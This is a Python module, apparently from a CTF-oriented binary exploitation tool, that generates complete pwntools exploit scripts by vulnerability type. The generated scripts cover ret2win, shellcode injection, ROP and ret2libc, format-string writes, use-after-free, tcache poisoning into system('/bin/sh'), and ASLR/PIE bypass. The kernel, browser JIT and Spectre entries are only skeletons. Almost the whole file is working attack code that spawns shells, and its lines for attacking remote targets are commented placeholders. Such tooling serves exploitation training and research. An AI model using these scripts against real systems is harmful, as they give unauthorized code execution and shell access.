"""
payload_crafter.py — Generate ready-to-use pwntools exploit scripts.

Each crafter function receives the analysis context and returns a
complete Python exploit script string tailored to the binary.
"""

from __future__ import annotations
import os


def craft_payload(vuln_id: int, ctx: dict) -> str:
    """Dispatch to the correct crafter based on vulnerability ID."""
    crafters = {
        1: _craft_ret2win,
        2: _craft_fmtstr_leak,
        3: _craft_shellcode,
        4: _craft_integer_overflow,
        5: _craft_rop,
        6: _craft_heap_overflow,
        7: _craft_fmtstr_write,
        8: _craft_uaf,
        9: _craft_heap_advanced,
        10: _craft_aslr_pie,
        11: _craft_kernel,
        12: _craft_browser,
        13: _craft_side_channel,
    }
    fn = crafters.get(vuln_id)
    if not fn:
        return ""
    try:
        return fn(ctx)
    except Exception:
        return ""


def post_process_payload(script: str, auto: dict) -> str:
    """Fill in auto-detected values in a generated payload script.

    Replaces TODO placeholders with real values discovered by auto_detect.
    """
    if not script or not auto:
        return script

    # ── BOF offset ───────────────────────────────────────────────
    bof = auto.get("bof_offset")
    if bof is not None:
        script = script.replace(
            "offset = 72  # TODO: replace with actual offset",
            f"offset = {bof}  # ✓ Auto-detected via cyclic pattern!"
        )
        script = script.replace(
            "offset = 72  # TODO: replace",
            f"offset = {bof}  # ✓ Auto-detected!"
        )

    # ── Format string offset ─────────────────────────────────────
    fmt = auto.get("fmt_offset")
    if fmt is not None:
        script = script.replace(
            "fmt_offset = 6  # TODO: replace with actual offset",
            f"fmt_offset = {fmt}  # ✓ Auto-detected via %%p probes!"
        )

    # ── Input prompts (recvuntil) ────────────────────────────────
    prompts = auto.get("prompts", [])
    if prompts:
        prompt = prompts[0]
        prompt_bytes = repr(prompt.encode())
        # Add recvuntil before sendline calls
        prompt_comment = (
            f"\n# ── Auto-detected prompt ─────────────────────\n"
            f"# Binary shows: {prompt!r}\n"
            f"# p.recvuntil({prompt_bytes})\n"
        )
        # Insert after the process() line
        script = script.replace(
            "p = process(binary)\n",
            f"p = process(binary)\n{prompt_comment}",
            1  # Only first occurrence
        )

    # ── one_gadget addresses ─────────────────────────────────────
    gadgets = auto.get("one_gadgets", [])
    if gadgets:
        og_lines = "\n# ── one_gadget addresses (from libc) ─────────\n"
        for g in gadgets[:3]:
            constraints = ", ".join(g.get("constraints", []))
            og_lines += f"# one_gadget = libc.address + {g['addr']}  # constraints: {constraints}\n"
        # Insert before the last line
        if "p.interactive()" in script:
            script = script.replace(
                "p.interactive()",
                f"{og_lines}\np.interactive()"
            )

    # ── PIE warning ──────────────────────────────────────────────
    # (PIE note is already handled by individual crafters via context)

    # ── libc path ────────────────────────────────────────────────
    libc_path = auto.get("libc_path")
    if libc_path:
        script = script.replace(
            "libc   = elf.libc  # or: ELF('./libc.so.6')",
            f"libc   = ELF('{libc_path}')  # ✓ Auto-detected libc path"
        )

    return script


def _bin(ctx: dict) -> str:
    return os.path.basename(ctx.get("_filename", "binary"))


def _bits(ctx: dict) -> int:
    return ctx["protections"].bits


def _pack(ctx: dict) -> str:
    return "p64" if _bits(ctx) == 64 else "p32"


def _unpack(ctx: dict) -> str:
    return "u64" if _bits(ctx) == 64 else "u32"


def _win_funcs(ctx: dict) -> list[str]:
    win_names = {"win", "flag", "shell", "secret", "get_flag", "print_flag",
                 "give_shell", "backdoor", "system_call", "admin", "ret2win",
                 "cat_flag", "read_flag", "open_flag"}
    combined = set(ctx["exported_functions"]) | set(ctx["all_symbols"])
    return sorted(s for s in combined if s.lower() in win_names)


def _has_canary(ctx: dict) -> bool:
    return ctx["protections"].canary.value == "Enabled"


def _has_pie(ctx: dict) -> bool:
    return ctx["protections"].pie.value == "Enabled"


# ═══════════════════════════════════════════════════════════════════
# 1 — Stack Buffer Overflow / ret2win
# ═══════════════════════════════════════════════════════════════════
def _craft_ret2win(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    wins = _win_funcs(ctx)
    target = wins[0] if wins else "win"
    align = ""
    if _bits(ctx) == 64:
        align = (
            "\n# Stack alignment fix for 64-bit (if movaps segfault)\n"
            "ret_gadget = next(elf.search(asm('ret')))\n"
            f"payload += {pk}(ret_gadget)\n"
        )
    return f'''#!/usr/bin/env python3
"""Exploit: Stack Buffer Overflow — ret2win  |  Target: {b}"""
from pwn import *

# ── Setup ─────────────────────────────────────────
binary = './{b}'
elf    = context.binary = ELF(binary)

# Toggle: local vs remote
# p = remote('TARGET_HOST', TARGET_PORT)
p = process(binary)

# ── Step 1: Find offset with cyclic pattern ───────
# Uncomment to discover offset:
# p.sendline(cyclic(300))
# p.wait()
# offset = cyclic_find(0xDEADBEEF)  # replace with crash value
offset = 72  # TODO: replace with actual offset

# ── Step 2: Build payload ─────────────────────────
payload  = b'A' * offset
{align}payload += {pk}(elf.symbols['{target}'])

# ── Step 3: Send & interact ──────────────────────
p.sendline(payload)
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 2 — Format String (Info Leak)
# ═══════════════════════════════════════════════════════════════════
def _craft_fmtstr_leak(ctx: dict) -> str:
    b = _bin(ctx)
    return f'''#!/usr/bin/env python3
"""Exploit: Format String — Info Leak  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
p = process(binary)

# ── Step 1: Dump stack values ─────────────────────
# Send %p format specifiers to leak stack contents
for i in range(1, 30):
    p = process(binary)
    p.sendline(f'%{{i}}$p'.encode())
    leak = p.recvall(timeout=1)
    print(f'  [%{{i:2d}}$p]  {{leak.strip()}}')
    p.close()

# ── Step 2: Targeted leak (after finding offset) ──
# p = process(binary)
# p.sendline(b'%7$p')  # replace 7 with your offset
# leaked = int(p.recvline().strip(), 16)
# log.success(f'Leaked address: {{hex(leaked)}}')
#
# # Calculate bases:
# # libc_base = leaked - libc.symbols['__libc_start_main']
# # pie_base  = leaked - elf.symbols['main']
'''


# ═══════════════════════════════════════════════════════════════════
# 3 — Shellcode Injection (no NX)
# ═══════════════════════════════════════════════════════════════════
def _craft_shellcode(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    bits = _bits(ctx)
    arch = "amd64" if bits == 64 else "i386"
    return f'''#!/usr/bin/env python3
"""Exploit: Shellcode Injection (NX disabled)  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
context.arch = '{arch}'

p = process(binary)

# ── Step 1: Generate shellcode ────────────────────
shellcode = asm(shellcraft.sh())
log.info(f'Shellcode length: {{len(shellcode)}} bytes')

# ── Step 2: Find offset ──────────────────────────
offset = 72  # TODO: replace with actual offset

# ── Step 3: Find buffer address ──────────────────
# Option A: Static (no PIE) — find in gdb
buf_addr = 0xDEADBEEF  # TODO: replace with actual buffer address

# Option B: Use JMP RSP/ESP gadget (works with ASLR)
# jmp_rsp = next(elf.search(asm('jmp rsp')))

# ── Step 4: Build payload ────────────────────────
# Layout: [NOP sled + shellcode + padding + return address]
nop_sled = asm('nop') * (offset - len(shellcode))
payload  = nop_sled + shellcode
payload += {pk}(buf_addr)

# Alternative with JMP RSP (shellcode after return addr):
# payload = b'A' * offset + {pk}(jmp_rsp) + asm('nop') * 16 + shellcode

# ── Step 5: Exploit ─────────────────────────────
p.sendline(payload)
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 4 — Integer Overflow
# ═══════════════════════════════════════════════════════════════════
def _craft_integer_overflow(ctx: dict) -> str:
    b = _bin(ctx)
    bits = _bits(ctx)
    max_val = "0xFFFFFFFFFFFFFFFF" if bits == 64 else "0xFFFFFFFF"
    return f'''#!/usr/bin/env python3
"""Exploit: Integer Overflow / Underflow  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)

# ── Boundary values to test ──────────────────────
test_values = [
    0,                  # Zero — may cause zero-size alloc
    -1,                 # Wraps to {max_val} unsigned
    2147483647,         # INT_MAX (32-bit signed)
    2147483648,         # INT_MAX + 1 → wraps to INT_MIN
    4294967295,         # UINT_MAX (32-bit)
    {max_val},          # Max unsigned for this arch
]

for val in test_values:
    try:
        p = process(binary)
        p.sendline(str(val).encode())
        resp = p.recvall(timeout=2)
        status = 'CRASH' if p.poll() is not None and p.poll() != 0 else 'OK'
        log.info(f'Value {{val}} ({{hex(val & 0xffffffff)}}): {{status}}')
        p.close()
    except Exception as e:
        log.warning(f'Value {{val}}: {{e}}')

# ── After finding the right value ────────────────
# p = process(binary)
# p.sendline(b'-1')  # or the value that bypasses the check
# # Continue with the downstream exploit (heap overflow, etc.)
# p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 5 — ROP
# ═══════════════════════════════════════════════════════════════════
def _craft_rop(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    uk = _unpack(ctx)
    pad = 8 if _bits(ctx) == 64 else 4
    return f'''#!/usr/bin/env python3
"""Exploit: Return-Oriented Programming (ROP)  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
libc   = elf.libc  # or: ELF('./libc.so.6')

# p = remote('TARGET_HOST', TARGET_PORT)
p = process(binary)

offset = 72  # TODO: replace with actual offset

# ══════════════════════════════════════════════════
# Stage 1: Leak libc address via puts@GOT
# ══════════════════════════════════════════════════
rop1 = ROP(elf)
rop1.puts(elf.got['puts'])        # Leak puts@GOT
rop1.call(elf.symbols['main'])    # Return to main

payload1 = b'A' * offset + rop1.chain()
p.sendline(payload1)

# Parse the leaked address
leaked = {uk}(p.recvline().strip().ljust({pad}, b'\\x00'))
libc.address = leaked - libc.symbols['puts']
log.success(f'libc base: {{hex(libc.address)}}')

# ══════════════════════════════════════════════════
# Stage 2: ret2libc — system('/bin/sh')
# ══════════════════════════════════════════════════
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\\x00')))

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 6 — Heap Overflow
# ═══════════════════════════════════════════════════════════════════
def _craft_heap_overflow(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    return f'''#!/usr/bin/env python3
"""Exploit: Heap Overflow  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
p = process(binary)

# ── Heap overflow template ───────────────────────
# Adjust these based on reverse engineering the binary

def alloc(size, data):
    """Wrapper for the binary's allocation function."""
    p.sendlineafter(b'> ', b'1')        # TODO: adjust menu option
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def free(idx):
    """Wrapper for the binary's free function."""
    p.sendlineafter(b'> ', b'2')        # TODO: adjust menu option
    p.sendlineafter(b'Index: ', str(idx).encode())

# ── Step 1: Create adjacent chunks ───────────────
alloc(0x68, b'A' * 0x68)   # Chunk 0 — our overflow source
alloc(0x68, b'B' * 0x68)   # Chunk 1 — target to corrupt

# ── Step 2: Overflow into next chunk ─────────────
# Overwrite chunk 1's metadata (fd pointer / size)
overflow = b'A' * 0x68     # Fill chunk 0
overflow += {pk}(0x71)      # Fake prev_size + size for chunk 1
overflow += {pk}(0xDEADBEEF)  # Overwrite chunk 1's fd → target addr
alloc(0x68, overflow)        # TODO: use edit if available

# ── Step 3: Trigger ──────────────────────────────
# free(1)  # Free corrupted chunk
# alloc(0x68, payload)  # Get allocation at target address
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 7 — Format String (Arbitrary Write)
# ═══════════════════════════════════════════════════════════════════
def _craft_fmtstr_write(ctx: dict) -> str:
    b = _bin(ctx)
    return f'''#!/usr/bin/env python3
"""Exploit: Format String — Arbitrary Write (%n)  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)

# p = remote('TARGET_HOST', TARGET_PORT)
p = process(binary)

# ── Step 1: Find format string offset ────────────
# Send: AAAA%p.%p.%p.%p.%p.%p.%p.%p
# Look for 0x41414141 in the output → that position is your offset
fmt_offset = 6  # TODO: replace with actual offset

# ── Step 2: Define targets ───────────────────────
# Overwrite GOT entry of a function called after printf
target_addr = elf.got['exit']      # or elf.got['puts'], etc.
write_value = elf.symbols['win']   # or: libc system() address

# ── Step 3: Generate payload with pwntools ───────
payload = fmtstr_payload(fmt_offset, {{target_addr: write_value}})
log.info(f'Payload length: {{len(payload)}} bytes')

# ── Step 4: Send payload & trigger ───────────────
p.sendline(payload)
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 8 — Use-After-Free
# ═══════════════════════════════════════════════════════════════════
def _craft_uaf(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    return f'''#!/usr/bin/env python3
"""Exploit: Use-After-Free (UAF)  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
p = process(binary)

# ── Menu wrappers (adjust to match binary) ───────
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvline()

def edit(idx, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# ── Step 1: Allocate and free ────────────────────
create(0x68, b'A' * 0x68)   # Object 0
create(0x68, b'B' * 0x68)   # Object 1 (prevent consolidation)

delete(0)  # Free object 0 → goes to tcache/fastbin

# ── Step 2: Reclaim with controlled data ─────────
# Allocate same-size chunk → lands in freed slot
target_func = elf.symbols.get('win', 0xDEADBEEF)
create(0x68, {pk}(target_func) + b'C' * 0x60)

# ── Step 3: Use dangling pointer ─────────────────
# show(0) or trigger the old object's function pointer
show(0)  # Reads from reclaimed chunk → leaks or triggers call

p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 9 — Heap Advanced (tcache / fastbin)
# ═══════════════════════════════════════════════════════════════════
def _craft_heap_advanced(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    return f'''#!/usr/bin/env python3
"""Exploit: Heap — tcache poisoning  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
libc   = elf.libc  # or: ELF('./libc.so.6')
p = process(binary)

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvuntil(b'\\n')

def edit(idx, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# ══════════════════════════════════════════════════
# Stage 1: Leak libc via unsorted bin
# ══════════════════════════════════════════════════
alloc(0x420, b'A' * 0x420)  # Chunk 0 — large, goes to unsorted bin
alloc(0x20,  b'B' * 0x20)   # Chunk 1 — guard against top consolidation
free(0)                      # Unsorted bin → fd/bk point to main_arena

leaked = u64(show(0)[:6].ljust(8, b'\\x00'))
libc.address = leaked - (libc.symbols['main_arena'] + 96)
log.success(f'libc base: {{hex(libc.address)}}')

# ══════════════════════════════════════════════════
# Stage 2: Tcache poisoning → arbitrary write
# ══════════════════════════════════════════════════
alloc(0x68, b'X' * 0x68)    # Chunk 2
alloc(0x68, b'Y' * 0x68)    # Chunk 3
free(2)

# Overwrite freed chunk's fd → __free_hook
target = libc.symbols['__free_hook']  # glibc < 2.34
edit(2, {pk}(target))

alloc(0x68, b'/bin/sh\\x00')       # Chunk 4 — reclaim
alloc(0x68, {pk}(libc.symbols['system']))  # Chunk 5 → at __free_hook

# ══════════════════════════════════════════════════
# Stage 3: Trigger system("/bin/sh")
# ══════════════════════════════════════════════════
free(4)  # free("/bin/sh") → __free_hook → system("/bin/sh")
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 10 — ASLR + PIE Bypass
# ═══════════════════════════════════════════════════════════════════
def _craft_aslr_pie(ctx: dict) -> str:
    b = _bin(ctx)
    pk = _pack(ctx)
    uk = _unpack(ctx)
    pad = 8 if _bits(ctx) == 64 else 4
    return f'''#!/usr/bin/env python3
"""Exploit: ASLR + PIE Bypass (info leak chaining)  |  Target: {b}"""
from pwn import *

binary = './{b}'
elf    = context.binary = ELF(binary)
libc   = elf.libc

p = process(binary)

# ══════════════════════════════════════════════════
# Stage 1: Leak PIE base
# ══════════════════════════════════════════════════
# Method: format string, partial overwrite, or uninitialized read
p.sendline(b'%3$p')  # TODO: adjust offset
pie_leak = int(p.recvline().strip(), 16)
elf.address = pie_leak - elf.symbols['main']  # TODO: adjust symbol
log.success(f'PIE base: {{hex(elf.address)}}')

# ══════════════════════════════════════════════════
# Stage 2: Leak libc base
# ══════════════════════════════════════════════════
p.sendline(b'%7$p')  # TODO: adjust offset
libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - libc.symbols['__libc_start_main']
log.success(f'libc base: {{hex(libc.address)}}')

# ══════════════════════════════════════════════════
# Stage 3: Build exploit with known addresses
# ══════════════════════════════════════════════════
offset = 72  # TODO: replace

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\\x00')))

payload  = b'A' * offset
payload += rop.chain()

p.sendline(payload)
p.interactive()
'''


# ═══════════════════════════════════════════════════════════════════
# 11–13 — Kernel / Browser / Side-channel (templates)
# ═══════════════════════════════════════════════════════════════════
def _craft_kernel(ctx: dict) -> str:
    return '''#!/usr/bin/env python3
"""Exploit: Kernel — privilege escalation template"""
# This is a structural template. Kernel exploits are highly specific.
import ctypes, os, struct

# Step 1: Open the vulnerable device
fd = os.open('/dev/vulnerable_device', os.O_RDWR)  # TODO: adjust

# Step 2: Craft ioctl payload
payload = struct.pack('<Q', 0xDEADBEEF) * 16  # TODO: adjust

# Step 3: Trigger the vulnerability
# os.ioctl(fd, IOCTL_CMD, payload)  # TODO: adjust IOCTL_CMD

# Step 4: After gaining kernel code exec, escalate:
# commit_creds(prepare_kernel_cred(0))
# Then return to userspace and exec /bin/sh

print("[*] Template — customize for your target kernel module")
print("[*] Use QEMU + gdb for safe development")
'''


def _craft_browser(ctx: dict) -> str:
    return '''// Exploit: Browser/JIT — template (V8 / SpiderMonkey)
// This is a structural template for JIT exploitation.

// Step 1: Trigger the JIT bug (type confusion / OOB)
function trigger() {
    // TODO: insert PoC that causes OOB or type confusion
    let arr = [1.1, 2.2, 3.3];
    // ... JIT optimization trigger ...
    return arr;
}

// Step 2: Build addrof / fakeobj primitives
function addrof(obj) { /* ... */ }
function fakeobj(addr) { /* ... */ }

// Step 3: Arbitrary read/write via fake ArrayBuffer
// Step 4: Overwrite JIT code or WASM RWX page
// Step 5: Execute shellcode

console.log("[*] Template — customize for your target engine version");
'''


def _craft_side_channel(ctx: dict) -> str:
    return '''#!/usr/bin/env python3
"""Exploit: Side-channel (Flush+Reload / Spectre template)"""
import time, ctypes

# This is a structural template. Side-channel attacks require
# architecture-specific code (usually C with inline asm).

# Step 1: Allocate probe array (256 × cache line size)
CACHE_LINE = 64
probe = bytearray(256 * CACHE_LINE)

# Step 2: Flush probe array from cache
# for i in range(256):
#     clflush(probe[i * CACHE_LINE])

# Step 3: Trigger speculative / victim access
# victim_function(malicious_index)

# Step 4: Time access to each probe element
# for i in range(256):
#     t = rdtsc()
#     _ = probe[i * CACHE_LINE]
#     dt = rdtsc() - t
#     if dt < THRESHOLD:
#         secret_byte = i

print("[*] Template — implement in C with rdtsc/clflush intrinsics")
print("[*] See: https://spectreattack.com for reference PoCs")
'''
